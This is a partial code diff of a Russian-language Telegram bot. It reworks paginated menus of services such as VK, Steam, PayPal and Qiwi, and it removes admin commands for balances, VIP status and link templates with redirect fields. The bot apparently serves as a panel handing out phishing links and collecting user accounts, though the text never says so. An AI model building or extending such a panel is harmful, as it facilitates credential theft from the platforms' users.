-            callback_data: 'showLinks_tt'
-        }, {
-            text: 'Steam',
-            callback_data: 'showLinks_st'
-        }],
-
-        [{
-            text: 'World of Tanks',
-            callback_data: 'showLinks_wot'
-        }, {
-            text: 'Minecraft',
-            callback_data: 'showLinks_mc'
-        }],
-        [{
-            text: 'Telegram',
-            callback_data: 'showLinks_tg'
-        }, {
-            text: 'SocialClub',
-            callback_data: 'showLinks_sc'
-        }],
-        [{
-            text: 'Samp',
-            callback_data: 'showLinks_sp'
-        }, {
-            text: 'Fortnite',
-            callback_data: 'showLinks_ft'
-        }],
-        [{
-            text: 'Mail',
-            callback_data: 'showLinks_ml'
-        }, {
-            text: 'Yandex',
-            callback_data: 'showLinks_ya'
-        }],
-        [{
-            text: 'Google',
-            callback_data: 'showLinks_gl'
-        }, {
-            text: 'Yahoo',
-            callback_data: 'showLinks_yh'
-        }],
-        [{
-            text: 'Twitter',
-            callback_data: 'showLinks_tw'
-        }, {
-            text: 'Discord',
-            callback_data: 'showLinks_ds'
-        }],
-        [{
-            text: 'Gaijin',
-            callback_data: 'showLinks_gj'
-        }, {
-            text: 'Microsoft',
-            callback_data: 'showLinks_ms'
-        }],
-        [{
-            text: 'Payeer',
-            callback_data: 'showLinks_pr'
-        }, {
-            text: 'PayPal',
-            callback_data: 'showLinks_pp'
-        }],
-        [{
-            text: 'Roblox',
-            callback_data: 'showLinks_rb'
-        }, {
-            text: 'Amazon',
-            callback_data: 'showLinks_az'
-        }],
-        [{
-            text: 'Qiwi',
-            callback_data: 'showLinks_qw'
-        }, {
-            text: 'Webmoney',
-            callback_data: 'showLinks_wm'
-        }],
-    ]
-    let id = Number(callbackQuery.data.split('_')[1])
-    await bot.editMessageText(callbackQuery.message.text,
-        {chat_id: callbackQuery.message.chat.id,
-        message_id: callbackQuery.message.message_id,
-        reply_markup: {
-            inline_keyboard: [
-                ReplayList[id-3]? ReplayList[id-3]:[],
-                ReplayList[id-2]? ReplayList[id-2]:[],
-                ReplayList[id-1] ? ReplayList[id-1]:[],
-                ReplayList[id-4] ? [{text:'⬅️', callback_data: 'prevLinksReplay_'+Number(id-3)},{text:'➡️', callback_data: 'nextLinksReplay_'+Number(id)}] : [{text:'➡️', callback_data: 'nextLinksReplay_'+Number(id)}]
-            ]
-        }
-    }).catch(err => {})
-}
-async function ShowNextLinksReplay(callbackQuery) {
-    const ReplayList = [
-        [{
-            text: 'Вконтакте',
-            callback_data: 'showLinks_vk'
-        }, {
-            text: 'Instagram',
-            callback_data: 'showLinks_inst'
-        }],
-        [{
-            text: 'Одноклассники',
-            callback_data: 'showLinks_ok'
-        }, {
-            text: 'Facebook',
-            callback_data: 'showLinks_fb'
-        }],
-        [{
-            text: 'TikTok',
-            callback_data: 'showLinks_tt'
-        }, {
-            text: 'Steam',
-            callback_data: 'showLinks_st'
-        }],
-
-        [{
-            text: 'World of Tanks',
-            callback_data: 'showLinks_wot'
-        }, {
-            text: 'Minecraft',
-            callback_data: 'showLinks_mc'
-        }],
-        [{
-            text: 'Telegram',
-            callback_data: 'showLinks_tg'
-        }, {
-            text: 'SocialClub',
-            callback_data: 'showLinks_sc'
-        }],
-        [{
-            text: 'Samp',
-            callback_data: 'showLinks_sp'
-        }, {
-            text: 'Fortnite',
-            callback_data: 'showLinks_ft'
-        }],
-        [{
-            text: 'Mail',
-            callback_data: 'showLinks_ml'
-        }, {
-            text: 'Yandex',
-            callback_data: 'showLinks_ya'
-        }],
-        [{
-            text: 'Google',
-            callback_data: 'showLinks_gl'
-        }, {
-            text: 'Yahoo',
-            callback_data: 'showLinks_yh'
-        }],
-        [{
-            text: 'Twitter',
-            callback_data: 'showLinks_tw'
-        }, {
-            text: 'Discord',
-            callback_data: 'showLinks_ds'
-        }],
-        [{
-            text: 'Gaijin',
-            callback_data: 'showLinks_gj'
-        }, {
-            text: 'Microsoft',
-            callback_data: 'showLinks_ms'
-        }],
-        [{
-            text: 'Payeer',
-            callback_data: 'showLinks_pr'
-        }, {
-            text: 'PayPal',
-            callback_data: 'showLinks_pp'
-        }],
-        [{
-            text: 'Roblox',
-            callback_data: 'showLinks_rb'
-        }, {
-            text: 'Amazon',
-            callback_data: 'showLinks_az'
-        }],
-        [{
-            text: 'Qiwi',
-            callback_data: 'showLinks_qw'
-        }, {
-            text: 'Webmoney',
-            callback_data: 'showLinks_wm'
-        }],
-    ]
-    let id = Number(callbackQuery.data.split('_')[1])
-    await bot.editMessageText(callbackQuery.message.text,
-        {chat_id: callbackQuery.message.chat.id,
-        message_id: callbackQuery.message.message_id,
-        reply_markup: {
-            inline_keyboard: [
-                ReplayList[id]?ReplayList[id]:[],
-                ReplayList[id+1]?ReplayList[id+1]:[],
-                ReplayList[id+2] ? ReplayList[id+2]:[],
-                ReplayList[id+3] ? [{text:'⬅️', callback_data: 'prevLinksReplay_'+id},{text:'➡️', callback_data: 'nextLinksReplay_'+Number(id+3)}] : [{text:'⬅️', callback_data: 'prevLinksReplay_'+id}]
-            ]
-        }
-    }).catch(err => {})
-}
 bot.onText(/Написать админу/, (msg) => {
     bot.sendMessage(msg.chat.id, 'Связаться с админом можно тут 👉🏻 ' + process.env.Admin)
 })
@@ -946,7 +435,7 @@ bot.onText(/👤 Мой профиль/, async (msg) => {
         const accounts = await account.find({
             tg_id: msg.chat.id
         })
-        if(user.vip){
+        if (user.vip) {
             admin = 'VIP Пользователь'
         }
         if (user.isAdmin) {
@@ -1662,196 +1151,111 @@ bot.on("callback_query", async (callbackQuery) => {
                         text: '➡️',
                         callback_data: 'nextLinksReplay_3'
                     }]
-                    
+
                 ]
             }
         })
     }
-    if (callbackQuery.data.split('_')[0] == 'nextAccsReplay') {
-        ShowNextAccsReplay(callbackQuery)
-    }
-    if (callbackQuery.data.split('_')[0] == 'prevLinksReplay') {
-        ShowPrevLinksReplay(callbackQuery)
-    }
+
     if (callbackQuery.data.split('_')[0] == 'nextLinksReplay') {
-        ShowNextLinksReplay(callbackQuery)
+        let id = Number(callbackQuery.data.split('_')[1])
+        await bot.editMessageText(callbackQuery.message.text, {
+            chat_id: callbackQuery.message.chat.id,
+            message_id: callbackQuery.message.message_id,
+            reply_markup: {
+                inline_keyboard: [
+                    ReplayListLinks[id] ? ReplayListLinks[id] : [],
+                    ReplayListLinks[id + 1] ? ReplayListLinks[id + 1] : [],
+                    ReplayListLinks[id + 2] ? ReplayListLinks[id + 2] : [],
+                    ReplayListLinks[id + 3] ? [{
+                        text: '⬅️',
+                        callback_data: 'prevLinksReplay_' + id
+                    }, {
+                        text: '➡️',
+                        callback_data: 'nextLinksReplay_' + Number(id + 3)
+                    }] : [{
+                        text: '⬅️',
+                        callback_data: 'prevLinksReplay_' + id
+                    }]
+                ]
+            }
+        }).catch(err => {})
     }
     if (callbackQuery.data.split('_')[0] == 'prevLinksReplay') {
-        ShowPrevLinksReplay(callbackQuery)
+        let id = Number(callbackQuery.data.split('_')[1])
+        await bot.editMessageText(callbackQuery.message.text, {
+            chat_id: callbackQuery.message.chat.id,
+            message_id: callbackQuery.message.message_id,
+            reply_markup: {
+                inline_keyboard: [
+                    ReplayListLinks[id - 3] ? ReplayListLinks[id - 3] : [],
+                    ReplayListLinks[id - 2] ? ReplayListLinks[id - 2] : [],
+                    ReplayListLinks[id - 1] ? ReplayListLinks[id - 1] : [],
+                    ReplayListLinks[id - 4] ? [{
+                        text: '⬅️',
+                        callback_data: 'prevLinksReplay_' + Number(id - 3)
+                    }, {
+                        text: '➡️',
+                        callback_data: 'nextLinksReplay_' + Number(id)
+                    }] : [{
+                        text: '➡️',
+                        callback_data: 'nextLinksReplay_' + Number(id)
+                    }]
+                ]
+            }
+        }).catch(err => {})
+    }
+    if (callbackQuery.data.split('_')[0] == 'nextAccsReplay') {
+        let id = Number(callbackQuery.data.split('_')[1])
+        await bot.editMessageText(callbackQuery.message.text, {
+            chat_id: callbackQuery.message.chat.id,
+            message_id: callbackQuery.message.message_id,
+            reply_markup: {
+                inline_keyboard: [
+                    ReplayListAccs[id] ? ReplayListAccs[id] : [],
+                    ReplayListAccs[id + 1] ? ReplayListAccs[id + 1] : [],
+                    ReplayListAccs[id + 2] ? ReplayListAccs[id + 2] : [],
+                    ReplayListAccs[id + 3] ? [{
+                        text: '⬅️',
+                        callback_data: 'prevAccsReplay_' + id
+                    }, {
+                        text: '➡️',
+                        callback_data: 'nextAccsReplay_' + Number(id + 3)
+                    }] : [{
+                        text: '⬅️',
+                        callback_data: 'prevAccsReplay_' + id
+                    }]
+                ]
+            }
+        }).catch(err => {})
+    }
+    if (callbackQuery.data.split('_')[0] == 'prevAccsReplay') {
+        let id = Number(callbackQuery.data.split('_')[1])
+        await bot.editMessageText(callbackQuery.message.text, {
+            chat_id: callbackQuery.message.chat.id,
+            message_id: callbackQuery.message.message_id,
+            reply_markup: {
+                inline_keyboard: [
+                    ReplayListAccs[id - 3] ? ReplayListAccs[id - 3] : [],
+                    ReplayListAccs[id - 2] ? ReplayListAccs[id - 2] : [],
+                    ReplayListAccs[id - 1] ? ReplayListAccs[id - 1] : [],
+                    ReplayListAccs[id - 4] ? [{
+                        text: '⬅️',
+                        callback_data: 'prevAccsReplay_' + Number(id - 3)
+                    }, {
+                        text: '➡️',
+                        callback_data: 'nextAccsReplay_' + Number(id)
+                    }] : [{
+                        text: '➡️',
+                        callback_data: 'nextAccsReplay_' + Number(id)
+                    }]
+                ]
+            }
+        })
     }
 })
 
-bot.onText(/\/givebalance/, async (msg) => {
-    const user = await data.findOne({
-        tg_id: msg.from.id
-    })
-    if (user.isAdmin) {
-        if (msg.text.split(' ')[1] !== '' && (msg.text.split(' ')[2] !== '' && Number.isInteger(Number(msg.text.split(' ')[2])))) {
-            await data.findOne({
-                tg_id: Number(msg.text.split(' ')[1])
-            }).then(async (user) => {
-                if (user) {
-                    await data.updateOne({
-                        tg_id: Number(msg.text.split(' ')[1])
-                    }, {
-                        balance: Number(user.balance) + Number(msg.text.split(' ')[2]),
-                    }, {
-                        upsert: true
-                    }).then((data) => {
-                        if (data) {
-                            bot.sendMessage(msg.chat.id, `Баланс @${user.login} успешно обновлен (${user.balance}₽ → ${user.balance+Number(msg.text.split(' ')[2])}₽)`)
-                            bot.sendMessage(Number(msg.text.split(' ')[1]), `Ваш баланс был обновлен (${user.balance}₽ → ${user.balance+Number(msg.text.split(' ')[2])}₽)`)
-                        }
-                    }).catch(err => {
-                        bot.sendMessage(msg.chat.id, 'Что-то пошло не так, попробуйте позже')
-                    });
-                } else {
-                    bot.sendMessage(msg.chat.id, 'Пользователь с таким ID не найден')
-                }
-            })
-        } else {
-            bot.sendMessage(msg.chat.id, 'Неверный синтаксис, пожалуйста введите команду в виде\n/givebalnce <userID> <amount>')
-        }
-    }
-})
-bot.onText(/\/unvip/, async (msg) => {
-    const user = await data.findOne({
-        tg_id: msg.from.id
-    })
-    if (user.isAdmin) {
-        if (msg.text.split(' ')[1] !== '' && msg.text.split(' ')[2] !== '') {
-            await data.findOne({
-                tg_id: Number(msg.text.split(' ')[1])
-            }).then(async (user) => {
-                if (user) {
-                    await data.updateOne({
-                        tg_id: Number(msg.text.split(' ')[1])
-                    }, {
-                        vip: false,
-                        vipDate: '',
-                        vipType: '',
-                    }, {
-                        upsert: true
-                    }).then((data) => {
-                        if (data) {
-                            bot.sendMessage(msg.text.split(' ')[1], `Ваш статус VIP был обновлен.`)
-                            bot.sendMessage(msg.chat.id, `С пользователя @${user.login} успешно снят VIP статус.`)
-                        }
-                    }).catch(err => {
-                        bot.sendMessage(msg.chat.id, 'Что-то пошло не так, попробуйте позже')
-                    });
-                } else {
-                    bot.sendMessage(msg.chat.id, 'Пользователь с таким ID не найден')
-                }
-            })
-        } else {
-            bot.sendMessage(msg.chat.id, 'Неверный синтаксис, пожалуйста введите команду в виде\n/givebalnce <userID> <amount>')
-        }
-    }
-})
-bot.onText(/\/clear/, async (msg) => {
-    const user = await data.findOne({
-        tg_id: msg.from.id
-    })
-    if (user.isAdmin) {
-        if (msg.text.split(' ')[1] !== '' && msg.text.split(' ')[2] !== '') {
-            await data.findOne({
-                tg_id: Number(msg.text.split(' ')[1])
-            }).then(async (user) => {
-                if (user) {
-                    await data.deleteOne({
-                        tg_id: Number(msg.text.split(' ')[1])
-                    }).then((data) => {
-                        if (data) {
-                            bot.sendMessage(msg.chat.id, `Аккаунт @${user.login} успешно удален.`)
-                        }
-                    }).catch(err => {
-                        bot.sendMessage(msg.chat.id, 'Что-то пошло не так, попробуйте позже')
-                    });
-                } else {
-                    bot.sendMessage(msg.chat.id, 'Пользователь с таким ID не найден')
-                }
-            })
-        } else {
-            bot.sendMessage(msg.chat.id, 'Неверный синтаксис, пожалуйста введите команду в виде\n/clear <userID>')
-        }
-    }
-})
-bot.onText(/\/addnewlink/, async (msg) => {
-    const user = await data.findOne({
-        tg_id: msg.from.id
-    })
-    if (user.isAdmin) {
-        if (msg.text.split(' ')[1] !== '' && msg.text.split(' ')[2] !== '') {
-            await link.findOne({
-                link: msg.text.split(' ')[1]
-            }).then(async (user) => {
-                let querys = [],type = ''
-                msg.text.split(' ')[2].split(',').map(e=>{
-                    e=e.substr(1,e.length-2).split('|')
-                    type = e[1]
-                    querys[e[0]]={name:e[2], description:e[3].split('_').join(' '), image: e[4], redirect: e[5]}
-                })
-                 await new link({
-                        link: msg.text.split(' ')[1],
-                        type: type,
-                        query: querys,
-                }).save().then(() => {
-                    bot.sendMessage(msg.chat.id, 'Ссылка успешно добавлена')
-                })
-            })
-        } else {
-            bot.sendMessage(msg.chat.id, 'Неверный синтаксис, пожалуйста введите команду в виде\n/clear <userID>')
-        }
-    }
-})
-bot.onText(/\/removelink/, async (msg) => {
-    const user = await data.findOne({
-        tg_id: msg.from.id
-    })
-    if (user.isAdmin) {
-        if (msg.text.split(' ')[1] !== '') {
-            await link.findOne({
-                link: msg.text.split(' ')[1]
-            }).then(async (link) => {
-                if(link){
-                    if(msg.text.split(' ')[2]){
-                        let query = link.query
-                        query.splice(Number(msg.text.split(' ')[2]), 1)
-                        console.log(query)
-                        await link.updateOne({
-                            link: msg.text.split(' ')[1]
-                        }, {
-                            query: query
-                        }, {
-                            upsert: true
-                        }).then((data) => {
-                            if (data) {
-                                bot.sendMessage(msg.chat.id, `Шаблон #${msg.text.split(' ')[2]} успешно удален`)
-                            }
-                        }).catch(err => {
-                            bot.sendMessage(msg.chat.id, 'Что-то пошло не так, попробуйте позже')
-                        });
-                    }else{
-                        await link.deleteOne({
-                            link: msg.text.split(' ')[1]
-                        }).then((data) => {
-                            if (data) {
-                                bot.sendMessage(msg.chat.id, `Ссылка ${msg.text.split(' ')[1]} успешно удалена`)
-                            }
-                        }).catch(err => {
-                            bot.sendMessage(msg.chat.id, 'Что-то пошло не так, попробуйте позже')
-                        });
-                    }
-                }else{
-                    bot.sendMessage(msg.chat.id, 'Такой ссылки не найдено.')
-                }
-            })
-        } else {
-            bot.sendMessage(msg.chat.id, 'Неверный синтаксис, пожалуйста введите команду в виде\n/clear <userID>')
-        }
-    }
-})
+
 bot.on('message', msg => {
     console.log(msg)
 })
